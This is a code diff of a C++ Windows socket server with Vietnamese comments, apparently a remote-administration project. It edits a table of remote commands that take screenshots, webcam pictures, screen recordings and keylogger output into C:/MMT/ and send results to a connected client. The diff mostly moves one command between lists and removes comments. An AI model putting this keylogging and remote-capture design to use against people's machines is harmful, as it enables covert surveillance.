@@ -5,6 +5,7 @@
 const string saveDir = "C:/MMT/";
 
 // Các command cần tạo file output
+// fileCommands chỉ nên chứa các lệnh cần tạo file
 std::map<std::string, std::string> fileCommands = {
     {"get_screenshot", saveDir + "screenshot.png"},
     {"get_picture", saveDir + "picture.png"},
@@ -12,13 +13,13 @@ std::map<std::string, std::string> fileCommands = {
     {"list_process", saveDir + "processes_with_pid.txt"},
     {"list_installed", saveDir + "installed_programs.txt"},
     {"start_recording", saveDir + "recording.avi"},
-    {"keylogger", saveDir + "keylog.txt"}  // Thêm keylogger vào fileCommands
-};
+    {"stop_recording",
+     saveDir + "recording.avi"},  // Thêm stop_recording vào đây
+    {"keylogger", saveDir + "keylog.txt"}};
 
-// Các command không cần tạo file nhưng cần confirmation
+// simpleCommands chỉ nên chứa các lệnh đơn giản
 std::set<std::string> simpleCommands = {"shutdown", "restart",
-                                        "cancel_shutdown", "stop_recording",
-                                        "start_recording"};
+                                        "cancel_shutdown"};
 
 bool is_start_program_command(const std::string& command) {
   return command.find("start_program") == 0;
@@ -212,7 +213,6 @@ void handle_client(SOCKET clientSocket) {
                sizeof(fileSize), 0);
         }
       } else {
-        // Xử lý confirmation message như cũ
         std::string confirmMsg = "Command executed: " + command;
         size_t msgSize = confirmMsg.length();
         send(clientSocket, reinterpret_cast<const char*>(&msgSize),
@@ -220,7 +220,6 @@ void handle_client(SOCKET clientSocket) {
         send(clientSocket, confirmMsg.c_str(), static_cast<int>(msgSize), 0);
       }
     } else {
-      // Unknown command
       std::cout << "[Error] Unknown command received: " << command << std::endl;
       std::string errorMsg = "Unknown command: " + command;
       size_t msgSize = errorMsg.length();
@@ -252,8 +251,6 @@ int main() {
     WSACleanup();
     return 1;
   }
-
-  // Set socket option để reuse address
   int optval = 1;
   setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR,
              reinterpret_cast<const char*>(&optval), sizeof(optval));
